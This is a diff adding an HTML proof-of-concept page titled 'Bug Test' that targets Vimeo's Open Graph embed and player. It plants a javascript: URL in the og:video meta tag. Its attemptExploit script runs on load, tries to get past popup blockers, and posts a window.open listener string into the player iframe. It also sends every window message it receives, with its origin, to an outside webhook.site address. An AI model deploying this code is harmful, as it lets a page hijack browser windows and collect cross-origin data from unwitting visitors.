@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta property="og:site_name" content="Vimeo">
+    <meta property="og:url" content="https://vimeo.com/403530213">
+    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="Please Die">
+    <meta property="og:description" content="H4CK1NG 1S L1F3">
+    <meta property="og:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d">
+    <meta property="og:video" content="javascript:window.open('https://example.com','_blank')">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213">
+    <meta property="og:video:type" content="text/html">
+    <meta property="og:video:width" content="640">
+    <meta property="og:video:height" content="360">
+    <title>Bug Test</title>
+    <script src="https://player.vimeo.com/api/player.js"></script>
+    <script>
+        function logToWebhook(data) {
+            const img = new Image();
+            img.src = `https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?data=${encodeURIComponent(JSON.stringify(data))}`;
+        }
+
+        async function attemptExploit() {
+            try {
+                // Initialize player with autoplay
+                const player = new Vimeo.Player('vimeo-player', {
+                    url: 'https://player.vimeo.com/video/403530213',
+                    autoplay: true,
+                    controls: false
+                });
+
+                // Listen for play event
+                player.on('play', function() {
+                    // Try multiple window opening techniques
+                    try {
+                        // Method 1: Direct window.open
+                        window.open('https://example.com', '_blank', 'width=800,height=600');
+                        
+                        // Method 2: Delayed window.open
+                        setTimeout(() => {
+                            window.open('https://example.com', '_blank', 'width=800,height=600');
+                        }, 100);
+                        
+                        // Method 3: Try to bypass popup blockers
+                        const newWin = window.open('about:blank', '_blank');
+                        if(newWin) {
+                            newWin.location = 'https://example.com';
+                        }
+                        
+                        // Log success
+                        logToWebhook({
+                            type: 'window_open_attempted',
+                            timestamp: new Date().toISOString()
+                        });
+                    } catch(e) {
+                        logToWebhook({
+                            type: 'window_open_error',
+                            error: e.toString(),
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                });
+
+                // Create iframe with autoplay
+                const frame = document.createElement('iframe');
+                frame.src = 'https://player.vimeo.com/video/403530213?autoplay=1';
+                frame.width = '640';
+                frame.height = '360';
+                frame.allow = 'autoplay; fullscreen';
+                document.getElementById('vimeo-player').appendChild(frame);
+
+                // Try to trigger on iframe load
+                frame.onload = () => {
+                    try {
+                        // Try to open window from iframe context
+                        frame.contentWindow.postMessage({
+                            method: 'addEventListener',
+                            value: 'play',
+                            listener: 'window.open("https://example.com","_blank")'
+                        }, '*');
+
+                        logToWebhook({
+                            type: 'frame_loaded',
+                            timestamp: new Date().toISOString()
+                        });
+                    } catch(e) {
+                        logToWebhook({
+                            type: 'frame_error',
+                            error: e.toString(),
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                };
+            } catch(e) {
+                logToWebhook({
+                    type: 'error',
+                    error: e.toString(),
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+
+        // Listen for messages from iframe
+        window.onmessage = (e) => {
+            if(e.data && e.data.event === 'play') {
+                try {
+                    window.open('https://example.com', '_blank');
+                } catch(e) {}
+            }
+            
+            logToWebhook({
+                type: 'message_received',
+                origin: e.origin,
+                data: e.data,
+                timestamp: new Date().toISOString()
+            });
+        };
+
+        window.onload = attemptExploit;
+    </script>
+</head>
+<body>
+    <div id="vimeo-player"></div>
+</body>
+</html>
